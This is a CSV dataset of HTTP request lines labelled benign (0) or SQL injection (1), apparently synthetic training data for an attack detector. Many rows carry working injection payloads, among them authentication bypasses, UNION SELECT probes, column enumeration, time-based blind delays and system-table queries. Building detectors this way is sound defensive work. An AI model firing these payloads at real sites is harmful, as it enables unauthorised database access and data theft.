text,flow_duration,label
"GET /index.php?page=1' ORDER BY 1,2,3--+",5735,1
GET /products/books/p,139720,0
"POST /login {'user': '1-true', 'pass': 'password123'}",16674,1
GET /products/home/Q,46265,0
GET /blog/posts?page=12,145100,0
"POST /login {'user': 'r', 'pass': 'password123'}",86304,0
GET /search?q=y,124125,0
POST /search {'keyword': '' OR 1=1--'},93421,1
"POST /api/v1/cart/add {'item_id': '6153', 'quantity': 3}",79050,0
POST /search {'keyword': '' OR 1=1--'},136037,1
GET /admin/login?user=admin' #,3236,1
GET /products/details?productID=' AND user IS NULL; --,131754,1
GET /index.php?page=1' and '1'='1,93727,1
"POST /login.php {'username': 'AND false', 'password': 'password'}",72748,1
GET /search?q=W,66808,0
GET /images/products/6.jpg,25620,0
GET /products/details?productID=l,88129,0
"POST /login {'user': 'i', 'pass': 'password123'}",18951,0
"POST /login {'user': '' AND user IS NULL; --', 'pass': 'password123'}",5502,1
GET /search?q=%00,6503,1
GET /assets/css/main.css,127011,0
POST /search {'keyword': ''admin'--'},1918,1
"POST /api/v1/cart/add {'item_id': '6549', 'quantity': 2}",41729,0
GET /api/v1/users?id=2986,67527,0
GET /products/details?productID=L,76547,0
GET /api/v1/users?id=smith' OR '1'='1,55208,1
GET /products/details?productID=' OR 1=1--,4444,1
"POST /login {'user': 'i', 'pass': 'password123'}",60638,0
"POST /api/v1/cart/add {'item_id': '8401', 'quantity': 5}",68864,0
"POST /api/v1/cart/add {'item_id': '3186', 'quantity': 2}",59033,0
"POST /api/v1/cart/add {'item_id': '4251', 'quantity': 2}",44988,0
GET /user/profile?user_id='',1194,1
GET /items/show.php?id=' OR '1'='1,5157,1
GET /api/v1/users?id=' OR 'x'='x,5363,1
GET /api/v1/users?id=1' OR '1'='1' --,141586,1
"POST /api/v1/cart/add {'item_id': '1999', 'quantity': 2}",86770,0
GET /products/details?productID=admin' #,3190,1
GET /products/details?productID=N,87757,0
GET /admin/login?user=OR+%271%27%3D%271,195,1
"POST /api/v1/cart/add {'item_id': '6964', 'quantity': 4}",17062,0
GET /products/details?productID=8,9083,0
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",2536,1
POST /profile/update {'email': 'test.user@example.com'},61637,0
"POST /login {'user': 'OR '1'='1'', 'pass': 'password123'}",2513,1
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",979,1
GET /items/show.php?id=' AND user IS NULL; --,117542,1
GET /api/v1/users?id=1=1,38821,1
GET /products/details?productID=u,79247,0
GET /search?q='admin'--,851,1
"POST /login.php {'username': '' or 'x'='x', 'password': 'password'}",111244,1
GET /products/details?productID=M,41244,0
"GET /search.aspx?q="" OR 1 = 1 -- -",2969,1
"POST /login {'user': '-1 UNION SELECT 1 INTO @,@,@', 'pass': 'password123'}",2223,1
GET /assets/css/main.css,101780,0
GET /products/details?productID=Z,48425,0
GET /search?q=1 AND 1=1,6225,1
GET /search?q=h,85812,0
GET /search?q=' OR '1'='1,3516,1
"POST /login {'user': 'user1' or 1=1 --', 'pass': 'password123'}",123867,1
POST /profile/update {'email': 'test.user@example.com'},79164,0
GET /assets/css/main.css,102243,0
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",20323,1
GET /user/profile?user_id=1=1,4693,1
GET /search?q=p,57696,0
GET /api/v1/users?id=1' OR '1'='1' --,5296,1
GET /index.php?page=105-1,7813,1
POST /search {'keyword': '1=1'},3547,1
GET /products/home/N,48144,0
"POST /login {'user': 'a', 'pass': 'password123'}",10245,0
"POST /api/v1/cart/add {'item_id': '5797', 'quantity': 4}",29291,0
"POST /login {'user': 'admin' #', 'pass': 'password123'}",3601,1
GET /assets/css/main.css,50101,0
GET /images/products/m.jpg,14378,0
GET /products/details?productID=' GROUP BY columnnames having 1=1 --,5155,1
GET /search?q=9,19912,0
"POST /login {'user': '';WAITFOR DELAY '0:0:30'--', 'pass': 'password123'}",1447,1
GET /admin/login?user=' or 'x'='x,25006,1
POST /profile/update {'email': 'test.user@example.com'},43169,0
"GET /user/profile?user_id=1' GROUP BY 1,2,3--+",7953,1
POST /profile/update {'email': 'test.user@example.com'},85837,0
"POST /login.php {'username': ';', 'password': 'password'}",483,1
"POST /login.php {'username': 'x' or 1=1--', 'password': 'password'}",78010,1
GET /api/v1/users?id=5251,61034,0
GET /api/v1/users?id=2919,23304,0
POST /search {'keyword': '';WAITFOR DELAY '0:0:30'--'},54552,1
GET /api/v1/users?id=1024-2,125959,1
GET /search?q=V,32575,0
GET /api/v1/users?id=1166,89735,0
GET /products/details?productID=105-1,66734,1
GET /assets/css/main.css,61207,0
GET /products/details?productID=v,53853,0
"POST /login {'user': 'o', 'pass': 'password123'}",119501,0
GET /images/products/O.jpg,18335,0
GET /products/details?productID=g,27328,0
GET /api/v1/users?id=105-1,4256,1
"POST /login.php {'username': 'AND true', 'password': 'password'}",120314,1
GET /items/show.php?id='admin'--,116314,1
"POST /login {'user': 'k', 'pass': 'password123'}",28203,0
GET /admin/login?user='admin'--,125533,1
GET /products/electronics/K,25267,0
"POST /login {'user': 'F', 'pass': 'password123'}",77877,0
GET /api/v1/users?id=9555,64417,0
"POST /login {'user': 'OR+%271%27%3D%271', 'pass': 'password123'}",6452,1
GET /api/v1/users?id=9612,76293,0
GET /images/products/3.jpg,34822,0
POST /search {'keyword': 'user1' or 1=1 --'},21357,1
GET /api/v1/users?id=' AND user IS NULL; --,108846,1
GET /items/show.php?id=1 AND 1=1,141877,1
GET /blog/posts?page=5,50296,0
GET /items/show.php?id=OR 1=1,135141,1
GET /search.aspx?q=' OR '' = ',4354,1
"POST /api/v1/cart/add {'item_id': '2656', 'quantity': 2}",84561,0
GET /search.aspx?q=x' or 1=1--,2208,1
GET /search.aspx?q=1' OR '1'='1' --,18569,1
"POST /login {'user': 'm', 'pass': 'password123'}",66265,0
POST /profile/update {'email': 'test.user@example.com'},70368,0
GET /admin/login?user=OR '1'='1',7609,1
"GET /search?q=-1' UNION SELECT 1,2,3--+",68878,1
GET /search?q=J,51173,0
"POST /login {'user': 'T', 'pass': 'password123'}",67531,0
GET /admin/login?user='admin'--,6166,1
GET /products/details?productID=1' and '1'='1,147126,1
GET /index.php?page=' OR '1'='1,5925,1
GET /search?q=' OR 'x'='x,5263,1
GET /index.php?page=1024-2,64489,1
GET /products/details?productID=' OR 1=1--,14066,1
"POST /login {'user': 'D', 'pass': 'password123'}",134817,0
GET /api/v1/users?id=7479,91846,0
GET /assets/css/main.css,4633,0
"POST /login {'user': '8', 'pass': 'password123'}",108059,0
GET /search?q=9,100656,0
"POST /api/v1/cart/add {'item_id': '2306', 'quantity': 5}",20844,0
GET /api/v1/users?id=' OR 1=1--,4520,1
GET /admin/login?user=-- or #,891,1
GET /blog/posts?page=20,149232,0
GET /products/details?productID=';WAITFOR DELAY '0:0:30'--,51790,1
POST /search {'keyword': 'AND 1'},24623,1
GET /api/v1/users?id=5234,34514,0
"POST /login.php {'username': 'admin' #', 'password': 'password'}",54895,1
GET /admin/login?user=//,17603,1
GET /api/v1/users?id=OR '1'='1',3292,1
GET /images/products/T.jpg,6995,0
GET /search?q=' OR 1=1--,587,1
GET /search?q=p,9140,0
GET /search?q=' OR 'x'='x,26329,1
GET /api/v1/users?id='''''''''''''UNION SELECT '2,78266,1
GET /products/books/e,71104,0
GET /api/v1/users?id=1 AND 1=1,135660,1
GET /index.php?page=' OR 1=1 /*,36478,1
POST /search {'keyword': '' OR 'x'='x'},5829,1
"POST /login.php {'username': '1' and '1'='1', 'password': 'password'}",1730,1
"GET /api/v1/users?id=,",106041,1
GET /items/show.php?id=//,2459,1
"GET /user/profile?user_id=1' GROUP BY 1,2,--+",41210,1
GET /blog/posts?page=1,84772,0
GET /search.aspx?q=OR '1'='1',464,1
"POST /api/v1/cart/add {'item_id': '8445', 'quantity': 1}",145416,0
GET /items/show.php?id=' OR '1'='1,6091,1
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",33584,1
GET /api/v1/users?id=1 AND 1=1,131406,1
GET /products/details?productID=B,30489,0
"POST /login {'user': 'o', 'pass': 'password123'}",53818,0
GET /images/products/1.jpg,122577,0
GET /search?q=/*…*/,86465,1
GET /images/products/u.jpg,46010,0
GET /blog/posts?page=11,15717,0
GET /images/products/W.jpg,83225,0
"POST /login {'user': 'D', 'pass': 'password123'}",66010,0
GET /search?q=admin' #,18349,1
GET /assets/css/main.css,51019,0
GET /blog/posts?page=10,73602,0
GET /api/v1/users?id=8585,102829,0
POST /profile/update {'email': 'test.user@example.com'},45464,0
GET /search?q=x,22177,0
GET /search?q=2,83216,0
GET /search.aspx?q=1024-2,95140,1
GET /api/v1/users?id=OR+%271%27%3D%271,2500,1
GET /api/v1/users?id=7413,14191,0
GET /search?q=' OR '' = ',7207,1
GET /assets/css/main.css,55392,0
GET /search.aspx?q=1 AND (SELECT * FROM Users) = 1,2571,1
POST /search {'keyword': '1' ORDER BY 1--+'},5399,1
GET /products/home/w,23453,0
GET /search?q=3,6141,0
GET /admin/login?user=smith' OR '1'='1,84769,1
GET /search.aspx?q=' OR '1'='1,5737,1
GET /blog/posts?page=4,43781,0
GET /blog/posts?page=19,83125,0
"POST /login {'user': 'AND 1', 'pass': 'password123'}",523,1
GET /api/v1/users?id=\\,7901,1
GET /api/v1/users?id=9838,124275,0
GET /search?q=w,63557,0
"POST /api/v1/cart/add {'item_id': '6036', 'quantity': 2}",148296,0
GET /search.aspx?q=' OR 1=1 /*,146178,1
POST /search {'keyword': '`'},80301,1
GET /products/details?productID=1-false,4469,1
GET /items/show.php?id=1*1,774,1
GET /user/profile?user_id=1-true,6070,1
"POST /login {'user': 'L', 'pass': 'password123'}",16951,0
GET /user/profile?user_id=1' ORDER BY 2--+,73938,1
GET /search.aspx?q=admin' #,108048,1
GET /index.php?page=%2c(select%20*%20from%20(select(sleep(10)))a),110353,1
"POST /login.php {'username': '' AND user IS NULL; --', 'password': 'password'}",7779,1
GET /api/v1/users?id=8400,117623,0
GET /products/home/5,144402,0
GET /images/products/B.jpg,19268,0
GET /index.php?page=admin' #,1694,1
GET /search?q=105-1,134574,1
GET /images/products/P.jpg,13046,0
GET /admin/login?user=//,6643,1
GET /api/v1/users?id=' AND user IS NULL; --,6434,1
GET /search.aspx?q=-2,82230,1
GET /api/v1/users?id=8306,23139,0
POST /profile/update {'email': 'test.user@example.com'},44989,0
GET /search?q=admin' #,5623,1
GET /products/books/T,119224,0
"POST /login {'user': 'admin' #', 'pass': 'password123'}",17683,1
"POST /login.php {'username': '1*1', 'password': 'password'}",102424,1
GET /index.php?page=' OR 'x'='x,7877,1
GET /user/profile?user_id=' AND user IS NULL; --,28264,1
GET /api/v1/users?id=6418,65804,0
GET /products/details?productID=z,95080,0
GET /blog/posts?page=13,10856,0
"POST /login {'user': 'b', 'pass': 'password123'}",37802,0
GET /api/v1/users?id=8345,77767,0
"POST /login.php {'username': 'AND true', 'password': 'password'}",4393,1
GET /assets/css/main.css,22881,0
"POST /login {'user': 'W', 'pass': 'password123'}",43681,0
"POST /login {'user': 'W', 'pass': 'password123'}",33933,0
GET /products/details?productID=' OR 1=1--,106234,1
GET /images/products/j.jpg,85384,0
GET /admin/login?user=-- or #,7990,1
GET /user/profile?user_id=' OR 1=1 /*,7596,1
GET /search?q=S,44236,0
POST /search {'keyword': '1 AND 1=1'},15064,1
"POST /api/v1/cart/add {'item_id': '8767', 'quantity': 3}",30364,0
"POST /login {'user': ''admin'--', 'pass': 'password123'}",118736,1
GET /search?q=' OR 1=1--,56270,1
GET /user/profile?user_id=' OR '1'='1,125213,1
"POST /login.php {'username': '1' ORDER BY 2--+', 'password': 'password'}",6350,1
GET /search?q=1 AND (SELECT * FROM Users) = 1,22452,1
GET /search?q=1=1,4709,1
"POST /login {'user': '1' ORDER BY 1,2,3--+', 'pass': 'password123'}",5740,1
GET /products/details?productID=n,67016,0
GET /products/electronics/d,85283,0
GET /user/profile?user_id=OR '1'='1',7170,1
GET /products/details?productID=R,71330,0
"POST /login {'user': 'H', 'pass': 'password123'}",68938,0
"POST /login {'user': 's', 'pass': 'password123'}",14094,0
GET /search?q=' OR '1'='1,1206,1
"POST /login {'user': 'A', 'pass': 'password123'}",7539,0
GET /admin/login?user=105-1,3558,1
GET /search?q=7,72791,0
GET /products/home/8,64748,0
GET /search?q=`,7686,1
GET /search?q=f,84095,0
GET /search?q=1,109838,0
"POST /login {'user': 'c', 'pass': 'password123'}",22407,0
GET /search?q=1' OR '1'='1' --,68552,1
GET /products/details?productID=' or 1=1 limit 1 --,109527,1
GET /products/details?productID=' or 1=1 limit 1 --,113286,1
GET /products/details?productID=x' or 1=1--,126682,1
GET /products/details?productID=3,70985,0
GET /search?q=1 AND (SELECT * FROM Users) = 1,2465,1
POST /profile/update {'email': 'test.user@example.com'},43213,0
"POST /login.php {'username': '1' ORDER BY 1,2,3--+', 'password': 'password'}",126408,1
GET /search?q=OR+%271%27%3D%271,69655,1
GET /search?q=OR+%271%27%3D%271,45679,1
GET /api/v1/users?id=5947,82152,0
GET /assets/css/main.css,30798,0
POST /search {'keyword': '' OR 'x'='x'},119104,1
GET /products/details?productID=4,49016,0
GET /api/v1/users?id=5307,12319,0
GET /user/profile?user_id=' OR 1=1--,6240,1
GET /products/details?productID=1' ORDER BY 3--+,3692,1
GET /items/show.php?id=' OR '1,1399,1
GET /search?q=OR+%271%27%3D%271,7698,1
"POST /login.php {'username': 'OR '1'='1'', 'password': 'password'}",468,1
GET /products/details?productID=J,25188,0
GET /user/profile?user_id=' OR 'x'='x,84868,1
GET /blog/posts?page=3,73844,0
GET /products/details?productID=1024-2,7332,1
"POST /api/v1/cart/add {'item_id': '5070', 'quantity': 1}",41562,0
"POST /search {'keyword': '1' GROUP BY 1,2,--+'}",3852,1
"POST /login.php {'username': 'x' or 1=1--', 'password': 'password'}",5393,1
"POST /api/v1/cart/add {'item_id': '7765', 'quantity': 3}",79372,0
"GET /products/details?productID=-1 UNION SELECT 1 INTO @,@",20884,1
"POST /login.php {'username': '1' ORDER BY 2--+', 'password': 'password'}",2668,1
GET /index.php?page=OR+%271%27%3D%271,907,1
GET /blog/posts?page=2,25046,0
POST /profile/update {'email': 'test.user@example.com'},107329,0
GET /search.aspx?q=-- or #,4995,1
"POST /login {'user': '1' and '1'='1', 'pass': 'password123'}",5771,1
"POST /login {'user': 'b', 'pass': 'password123'}",63045,0
"POST /api/v1/cart/add {'item_id': '9504', 'quantity': 4}",144178,0
"POST /login.php {'username': '%2c(select%20*%20from%20(select(sleep(10)))a)', 'password': 'password'}",7464,1
GET /api/v1/users?id=1' ORDER BY 3--+,4598,1
"POST /login {'user': 'D', 'pass': 'password123'}",13419,0
"POST /login.php {'username': ';', 'password': 'password'}",44889,1
GET /products/details?productID=u,31985,0
GET /products/home/g,11573,0
GET /api/v1/users?id=5954,86540,0
POST /search {'keyword': '1' and '1'='1'},128228,1
GET /blog/posts?page=17,148567,0
GET /user/profile?user_id=' OR '1'='1,1773,1
GET /user/profile?user_id=admin' #,2545,1
GET /products/details?productID=' AND user IS NULL; --,68745,1
POST /profile/update {'email': 'test.user@example.com'},37976,0
GET /products/details?productID=1' and '1'='1,90610,1
"POST /login {'user': '"" OR 1 = 1 -- -', 'pass': 'password123'}",1399,1
GET /search?q=1' ORDER BY 3--+,4922,1
"POST /login {'user': '1=1', 'pass': 'password123'}",5858,1
GET /images/products/A.jpg,58970,0
"POST /login {'user': '' AND user IS NULL; --', 'pass': 'password123'}",33340,1
"POST /login {'user': 'smith' OR '1'='1', 'pass': 'password123'}",1927,1
GET /products/details?productID=l,21013,0
"POST /login {'user': 'C', 'pass': 'password123'}",14721,0
GET /admin/login?user=1-false,5106,1
GET /search.aspx?q=105-1,97518,1
GET /items/show.php?id='admin'--,108387,1
GET /admin/login?user='admin'--,3763,1
"POST /api/v1/cart/add {'item_id': '9086', 'quantity': 4}",27877,0
GET /search?q=OR '1'='1',3743,1
"POST /login {'user': 'j', 'pass': 'password123'}",85458,0
"POST /login.php {'username': '' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --', 'password': 'password'}",6668,1
GET /products/details?productID=' or 'x'='x,1985,1
GET /search?q=x' or 1=1--,116756,1
GET /products/details?productID=E,76697,0
GET /products/details?productID=v,108107,0
"POST /login {'user': '' OR '1'='1', 'pass': 'password123'}",124356,1
"POST /login {'user': 'OR+%271%27%3D%271', 'pass': 'password123'}",20914,1
GET /search.aspx?q=1024-2,7932,1
GET /blog/posts?page=2,119134,0
GET /search?q=1' OR '1'='1' --,79576,1
GET /admin/login?user=105-1,6920,1
GET /search?q=' OR '1'='1,67630,1
GET /products/details?productID=' OR 1=1 /*,132289,1
GET /search?q=AND 0,41925,1
GET /api/v1/users?id=7153,128918,0
GET /items/show.php?id=1=1,102713,1
GET /index.php?page=OR '1'='1',98757,1
"POST /login {'user': '6', 'pass': 'password123'}",53938,0
GET /search?q=105-1,5155,1
"POST /login.php {'username': '' OR '1'='1', 'password': 'password'}",8430,1
GET /api/v1/users?id=' AND user IS NULL; --,69385,1
GET /index.php?page='admin'--,2869,1
GET /search?q=admin' #,1886,1
"POST /login {'user': 'p', 'pass': 'password123'}",131177,0
GET /images/products/r.jpg,147996,0
GET /admin/login?user=1' and '1'='1,4941,1
GET /products/details?productID=1,66725,0
GET /products/details?productID=k,80934,0
POST /profile/update {'email': 'test.user@example.com'},89732,0
GET /search.aspx?q=admin' #,47359,1
GET /search?q=OR '1'='1',1756,1
POST /search {'keyword': '' GROUP BY columnnames having 1=1 --'},124074,1
"GET /index.php?page=""""",6030,1
"POST /login.php {'username': '1=1', 'password': 'password'}",3406,1
"POST /api/v1/cart/add {'item_id': '1529', 'quantity': 4}",68909,0
GET /search?q=' OR 1=1 /*,62347,1
GET /items/show.php?id=1 AND 1=1,5090,1
"GET /api/v1/users?id=,",772,1
GET /api/v1/users?id=1 AND 1=1,3796,1
GET /api/v1/users?id=8823,87109,0
GET /products/details?productID=0,52415,0
GET /items/show.php?id=' or 'x'='x,82317,1
"POST /login.php {'username': '' AND user IS NULL; --', 'password': 'password'}",7048,1
"POST /api/v1/cart/add {'item_id': '7657', 'quantity': 1}",13218,0
GET /index.php?page=' OR 'x'='x,56728,1
GET /items/show.php?id=user1' or 1=1 --,112209,1
GET /api/v1/users?id='admin'--,4222,1
POST /search {'keyword': 'smith' OR '1'='1'},549,1
GET /search?q=z,36546,0
"POST /login.php {'username': '' OR 1=1--', 'password': 'password'}",46099,1
GET /user/profile?user_id=105-1,1333,1
GET /products/details?productID=x' or 1=1--,4588,1
GET /blog/posts?page=19,36257,0
GET /api/v1/users?id=' OR 'x'='x,2969,1
GET /items/show.php?id=' or 'x'='x,5530,1
GET /search?q=z,88275,0
GET /search?q=H,46412,0
"POST /api/v1/cart/add {'item_id': '9261', 'quantity': 2}",45456,0
"POST /search {'keyword': ','}",5966,1
GET /user/profile?user_id=user1' or 1=1 --,107779,1
GET /api/v1/users?id=' OR '1,32756,1
GET /products/details?productID=q,33198,0
GET /assets/css/main.css,48550,0
GET /admin/login?user=1' ORDER BY 3--+,81805,1
GET /items/show.php?id=' OR 1=1--,61850,1
"POST /login {'user': '1024-2', 'pass': 'password123'}",4297,1
GET /api/v1/users?id=1692,38936,0
"POST /api/v1/cart/add {'item_id': '8015', 'quantity': 1}",80712,0
GET /search.aspx?q=x' or 1=1--,17210,1
"POST /login {'user': '-1' UNION SELECT 1,2,3--+', 'pass': 'password123'}",7722,1
GET /blog/posts?page=2,34603,0
GET /api/v1/users?id=1' OR '1'='1' --,4499,1
GET /admin/login?user=admin' #,55561,1
"POST /login {'user': '\', 'pass': 'password123'}",5650,1
"POST /login.php {'username': '1' ORDER BY 2--+', 'password': 'password'}",115424,1
GET /search?q=OR '1'='1',120171,1
"POST /login {'user': ''admin'--', 'pass': 'password123'}",3461,1
GET /products/details?productID=e,67290,0
POST /search {'keyword': 'user1' or 1=1 --'},4610,1
GET /blog/posts?page=18,12070,0
GET /products/details?productID=a,60856,0
"POST /login {'user': '1024-2', 'pass': 'password123'}",136644,1
"GET /admin/login?user=,(select * from (select(sleep(10)))a)",109002,1
GET /index.php?page=1' OR '1'='1' --,1303,1
POST /search {'keyword': ''=0--+'},2744,1
GET /blog/posts?page=16,21257,0
"POST /api/v1/cart/add {'item_id': '3853', 'quantity': 5}",74512,0
"POST /login {'user': '\', 'pass': 'password123'}",138269,1
GET /products/details?productID=1' and '1'='1,83207,1
"POST /login.php {'username': '/*…*/', 'password': 'password'}",56604,1
GET /blog/posts?page=6,66448,0
GET /blog/posts?page=1,57294,0
POST /search {'keyword': '1-true'},8622,1
"GET /search?q=""""",4475,1
GET /search?q=U,136327,0
GET /items/show.php?id=1024-2,74304,1
GET /api/v1/users?id=1991,66139,0
GET /products/details?productID=X,98080,0
"GET /search?q="" OR """" = """,1559,1
GET /admin/login?user=1=1,30498,1
GET /api/v1/users?id=2099,19061,0
GET /search?q=P,77261,0
GET /products/books/q,125550,0
GET /index.php?page=' AND user IS NULL; --,2820,1
GET /admin/login?user=' OR '1'='1,76027,1
GET /search?q=' or 1=1 limit 1 --,47863,1
GET /search?q=H,135576,0
"GET /products/details?productID=""""",31218,1
GET /items/show.php?id=1-false,27662,1
GET /api/v1/users?id=9682,10048,0
GET /search?q=1=1,8228,1
"POST /login {'user': 'W', 'pass': 'password123'}",36232,0
GET /blog/posts?page=4,26380,0
GET /api/v1/users?id=2448,147610,0
GET /assets/css/main.css,51310,0
GET /search?q=x,83103,0
GET /search.aspx?q=1 AND 1=1,620,1
POST /profile/update {'email': 'test.user@example.com'},68030,0
GET /search?q=E,13702,0
GET /products/details?productID=R,92324,0
GET /blog/posts?page=15,41623,0
"POST /login {'user': '' OR '1'='1', 'pass': 'password123'}",1591,1
GET /search?q=a,8503,0
POST /profile/update {'email': 'test.user@example.com'},14616,0
"POST /api/v1/cart/add {'item_id': '9656', 'quantity': 1}",34970,0
"POST /login {'user': 'I', 'pass': 'password123'}",108544,0
GET /search?q=k,132709,0
"POST /api/v1/cart/add {'item_id': '6350', 'quantity': 3}",80654,0
GET /products/details?productID=' OR 'x'='x,29402,1
GET /products/details?productID=S,79178,0
"POST /login.php {'username': '1' and '1'='1', 'password': 'password'}",7253,1
GET /images/products/5.jpg,6669,0
POST /search {'keyword': 'user1' or 1=1 --'},3250,1
GET /api/v1/users?id=x' or 1=1--,109216,1
GET /blog/posts?page=17,87210,0
"POST /api/v1/cart/add {'item_id': '2478', 'quantity': 3}",57529,0
"POST /login {'user': 'F', 'pass': 'password123'}",100337,0
GET /images/products/i.jpg,4042,0
"GET /api/v1/users?id=,(select * from (select(sleep(10)))a)",3454,1
"POST /login {'user': '' AND user IS NULL; --', 'pass': 'password123'}",1331,1
GET /search?q=W,66362,0
"POST /login {'user': '''', 'pass': 'password123'}",6118,1
GET /api/v1/users?id=1' and '1'='1,1256,1
GET /search?q=' or 1=1 limit 1 --,3105,1
GET /assets/css/main.css,6921,0
"POST /search {'keyword': '-1 UNION SELECT 1 INTO @,@'}",85762,1
GET /products/details?productID=1=1,116232,1
"POST /login {'user': '6', 'pass': 'password123'}",92464,0
GET /search?q=1' OR '1'='1' --,90859,1
GET /blog/posts?page=18,46156,0
"POST /login {'user': 'y', 'pass': 'password123'}",68448,0
GET /blog/posts?page=16,87216,0
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",4463,1
"POST /login.php {'username': 'admin' #', 'password': 'password'}",7249,1
GET /products/details?productID=admin' #,6335,1
GET /items/show.php?id=' OR '1'='1,100747,1
GET /search?q=R,35799,0
GET /api/v1/users?id=' OR '1'='1,30528,1
"POST /api/v1/cart/add {'item_id': '8658', 'quantity': 1}",73441,0
"POST /login.php {'username': 'x' or 1=1--', 'password': 'password'}",2169,1
POST /profile/update {'email': 'test.user@example.com'},6940,0
GET /search.aspx?q=user1' or 1=1 --,679,1
GET /search?q=B,7228,0
GET /admin/login?user=1 AND 1=1,3379,1
GET /api/v1/users?id=7825,109696,0
GET /assets/css/main.css,87060,0
GET /search?q=E,78503,0
GET /api/v1/users?id=105-1,52750,1
GET /api/v1/users?id=\,44157,1
GET /products/details?productID=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,93,1
"POST /login {'user': 'I', 'pass': 'password123'}",61617,0
GET /api/v1/users?id=;,1781,1
GET /products/details?productID=Z,67650,0
GET /api/v1/users?id=1' and '1'='1,6537,1
GET /products/details?productID=X,140432,0
"POST /login {'user': 'n', 'pass': 'password123'}",56294,0
GET /admin/login?user=1 AND 1=1,3350,1
GET /blog/posts?page=15,73701,0
GET /search?q=' OR 'x'='x,7630,1
GET /blog/posts?page=10,28504,0
GET /api/v1/users?id=1916,14236,0
GET /user/profile?user_id=1-false,3093,1
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",6210,1
POST /profile/update {'email': 'test.user@example.com'},83021,0
"POST /login {'user': 'n', 'pass': 'password123'}",57262,0
GET /products/details?productID=w,10315,0
GET /blog/posts?page=4,105262,0
GET /search?q=admin' #,7026,1
"POST /api/v1/cart/add {'item_id': '7093', 'quantity': 5}",10561,0
GET /products/details?productID=0,79805,0
GET /user/profile?user_id=admin' #,643,1
GET /items/show.php?id=admin' #,6618,1
GET /items/show.php?id=x' or 1=1--,57459,1
GET /index.php?page=' OR 1=1--,70536,1
GET /images/products/f.jpg,84021,0
POST /search {'keyword': '' OR 'x'='x'},5805,1
GET /products/details?productID=s,97408,0
GET /user/profile?user_id=' OR 1 -- -,128602,1
GET /images/products/b.jpg,50151,0
GET /search.aspx?q=1' and '1'='1,3513,1
POST /profile/update {'email': 'test.user@example.com'},119846,0
GET /search?q=S,130406,0
GET /admin/login?user=OR '1'='1',116444,1
GET /user/profile?user_id=1024-2,4275,1
"POST /api/v1/cart/add {'item_id': '7530', 'quantity': 4}",75174,0
GET /blog/posts?page=16,39362,0
GET /products/details?productID=u,22404,0
"POST /login.php {'username': '1=1', 'password': 'password'}",27201,1
GET /search?q=S,14167,0
GET /images/products/N.jpg,76063,0
GET /products/details?productID=D,60452,0
GET /images/products/P.jpg,71416,0
GET /products/details?productID=OR+%271%27%3D%271,66791,1
GET /images/products/A.jpg,134715,0
"POST /login {'user': '1=1', 'pass': 'password123'}",15057,1
GET /products/electronics/9,25424,0
GET /search?q=1024-2,4854,1
"GET /search?q=-1' UNION SELECT 1,2,3--+",129222,1
GET /products/details?productID=1' and '1'='1,5360,1
GET /blog/posts?page=8,90602,0
"POST /api/v1/cart/add {'item_id': '6126', 'quantity': 1}",76522,0
GET /api/v1/users?id=902,6048,0
GET /images/products/S.jpg,36312,0
GET /api/v1/users?id=7709,8168,0
GET /blog/posts?page=19,38352,0
GET /search?q=W,126595,0
GET /search?q=D,104415,0
GET /search?q=0,73843,0
"POST /login {'user': 'R', 'pass': 'password123'}",76470,0
"POST /login {'user': 'OR+%271%27%3D%271', 'pass': 'password123'}",2624,1
GET /search.aspx?q=1024-2,2408,1
POST /profile/update {'email': 'test.user@example.com'},105168,0
GET /index.php?page=AND false,4432,1
GET /api/v1/users?id=3501,75236,0
GET /search.aspx?q=1' OR '1'='1' --,1415,1
"POST /login {'user': '' OR 1 -- -', 'pass': 'password123'}",3148,1
GET /api/v1/users?id=3055,83792,0
GET /assets/css/main.css,149174,0
GET /admin/login?user=admin' #,8418,1
GET /search?q=``,2784,1
GET /api/v1/users?id=4780,77518,0
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",46974,1
GET /admin/login?user='admin'--,17724,1
GET /api/v1/users?id=6073,133216,0
GET /search?q=o,57974,0
POST /profile/update {'email': 'test.user@example.com'},33996,0
GET /products/details?productID=P,75848,0
POST /search {'keyword': 'admin' #'},132094,1
GET /api/v1/users?id=1024-2,628,1
